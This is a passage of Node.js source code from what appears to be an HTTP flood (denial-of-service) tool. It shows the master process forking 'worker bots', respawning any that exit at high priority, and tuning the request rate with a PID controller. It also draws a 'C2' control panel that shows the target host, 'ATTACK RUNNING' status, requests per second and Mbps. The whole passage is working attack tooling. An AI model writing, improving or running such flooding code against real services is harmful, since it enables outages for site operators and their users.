                currentReqInSec += msg.requests;
                totalErrors += msg.errors;
                workerConnections[worker.id] = msg.connections;
                currentBytesInSec += msg.bytes;
            }
        });
    });

    cluster.on('exit', (worker) => {
        delete workerConnections[worker.id];
        const w = cluster.fork();
        try { os.setPriority(w.process.pid, os.constants.priority.PRIORITY_HIGH); } catch (_) { }
    });

    // Graceful shutdown: propagate SIGINT/SIGTERM to workers and cleanup
    const shutdown = () => {
        log('Shutdown signal received, terminating workers...');
        for (const id in cluster.workers) {
            const worker = cluster.workers[id];
            if (worker) worker.process.kill('SIGTERM');
        }
        setTimeout(() => process.exit(0), 3000);
    };
    process.on('SIGINT', shutdown);
    process.on('SIGTERM', shutdown);

    // Compile statistics + run PID autotune every second
    setInterval(() => {
        reqPerSecond = currentReqInSec;
        mbpsSent = ((currentBytesInSec * 8) / (1024 * 1024)).toFixed(2);
        activeConnections = Object.values(workerConnections).reduce((sum, n) => sum + n, 0);

        // PID controller — only active when autoTune is on
        if (config.autoTune) {
            const error = loopLagMs - PID_TARGET_LAG;   // +ve = too slow, -ve = headroom
            pidIntegral = Math.max(-200, Math.min(200, pidIntegral + error));
            const derivative = error - pidPrevError;
            pidPrevError = error;

            const adjustment = (PID_KP * error) + (PID_KI * pidIntegral) + (PID_KD * derivative);
            // Negative adjustment = lag too high, reduce rate
            // Positive adjustment = system has headroom, increase rate
            const newRate = Math.max(1, Math.round(config.rate - adjustment));
            autoTuneDelta = newRate - config.rate;
            config.rate = newRate;

            if (!global.peakRPS || currentReqInSec > global.peakRPS) {
                global.peakRPS = currentReqInSec;
            }
        }

        currentReqInSec = 0;
        currentBytesInSec = 0;
    }, 1000);

    const startTime = Date.now();

    // Visual C2 console renderer using ANSI escape codes
    const printPanel = () => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const percentTime = Math.min(100, Math.floor((elapsed / config.duration) * 100));

        // Generate ASCII load bar
        const barWidth = 30;
        const filledWidth = Math.floor((percentTime / 100) * barWidth);
        const bar = '[' + '='.repeat(filledWidth) + ' '.repeat(barWidth - filledWidth) + ']';

        // Clear terminal screen and reset cursor position in-place
        process.stdout.write('\x1b[H\x1b[2J');

        process.stdout.write(`
\x1b[1;31m  ██████  ██  ██████  ███    ███  █████  
 ██       ██ ██       ████  ████ ██   ██ 
  █████   ██ ██   ███ ██ ████ ██ ███████ 
       ██ ██ ██    ██ ██  ██  ██ ██   ██ 
 ███████  ██  ██████  ██      ██ ██   ██ \x1b[0m
 ─────────────────────────────────────────────────────────────
 \x1b[1;37m[+] CONTROL PANEL: STATUS\x1b[0m
 ─────────────────────────────────────────────────────────────
 \x1b[1;36m[TARGET DETAILS]\x1b[0m
   Host        : ${HOST}
   Port        : ${PORT}
   Secure (SSL): ${IS_SSL ? 'YES' : 'NO'}
   URL Path    : ${targetUrl.pathname}

 \x1b[1;36m[CONFIG]\x1b[0m
   Method      : ${config.method.toUpperCase()}
   Mode        : ${config.post ? 'HTTP POST (Randomized payloads)' : 'HTTP GET'}
   Concurrency : ${config.concurrency} sockets/worker (Total: ${config.concurrency * config.workers})
   Workers     : ${config.workers} (Cluster processes)
   Rate factor : ${config.rate} req/burst
   Time Limit  : ${config.duration}s
   Status      : ${elapsed >= config.duration ? '\x1b[1;31mSHUTDOWN\x1b[0m' : '\x1b[1;32mATTACK RUNNING\x1b[0m'}

 \x1b[1;36m[TELEMETRY METRICS]\x1b[0m
   Active Conns: \x1b[1;32m${activeConnections.toLocaleString()}\x1b[0m
   Throughput  : \x1b[1;32m${mbpsSent} Mbps\x1b[0m
   Total Sent  : \x1b[1;33m${totalRequests.toLocaleString()}\x1b[0m
   Current RPS : \x1b[1;32m${reqPerSecond.toLocaleString()} req/s\x1b[0m
   Total Errors: \x1b[1;31m${totalErrors.toLocaleString()}\x1b[0m
   Loop Lag    : \x1b[1;${loopLagMs > 20 ? '31' : loopLagMs > 8 ? '33' : '32'}m${loopLagMs.toFixed(1)} ms\x1b[0m
   PID Δ Rate  : \x1b[1;${autoTuneDelta < 0 ? '31' : autoTuneDelta > 0 ? '32' : '37'}m${autoTuneDelta >= 0 ? '+' : ''}${autoTuneDelta} r/burst\x1b[0m

 \x1b[1;36m[PROGRESS]\x1b[0m
   Elapsed Time: ${elapsed}s / ${config.duration}s ${bar} (${percentTime}%)
 ─────────────────────────────────────────────────────────────
 \x1b[0;37mKeep Console Window Open. Press Ctrl+C to force abort.\x1b[0m
`);
    };

    // Frame update scheduler
    const panelInterval = setInterval(printPanel, 500);

    // Watch duration limit
    setTimeout(() => {
        clearInterval(panelInterval);
        console.log('\n\n[+] Time limit reached. Terminating simulation bots...');
        for (const id in cluster.workers) {
            cluster.workers[id].kill('SIGTERM');
        }
        console.log('[+] Done. All worker bots disconnected.');
        process.exit(0);
    }, config.duration * 1000);
}
